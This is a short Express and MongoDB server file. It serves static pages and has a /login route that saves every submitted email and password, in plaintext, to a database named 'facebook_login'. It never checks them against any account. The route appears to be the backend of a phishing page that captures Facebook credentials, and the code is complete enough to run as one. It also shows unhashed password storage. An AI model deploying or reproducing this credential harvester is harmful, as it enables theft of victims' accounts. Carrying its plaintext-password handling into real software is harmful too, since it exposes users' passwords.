const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const path = require('path');
const cors = require('cors'); // Add this line

const app = express();
const port = 3000;

// Middleware
app.use(cors()); // Add this line
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// MongoDB connection
mongoose.connect('mongodb://localhost:27017/facebook_login', {
  useNewUrlParser: true,
  useUnifiedTopology: true
});

const db = mongoose.connection;
db.on('error', console.error.bind(console, 'connection error:'));
db.once('open', () => {
  console.log('MongoDB connected...');
});

// Define a schema and model for user
const userSchema = new mongoose.Schema({
  email: String,
  password: String
});

const User = mongoose.model('User', userSchema);

// Serve the static HTML file
app.use(express.static(path.join(__dirname, 'public')));

// Handle form submission
app.post('/login', (req, res) => {
  const { email, password } = req.body;

  const newUser = new User({ email, password });

  newUser.save((err) => {
    if (err) {
      res.status(500).send('Error saving user to database.');
      console.error(err);
    } else {
      res.send('User saved successfully.');
    }
  });
});

app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
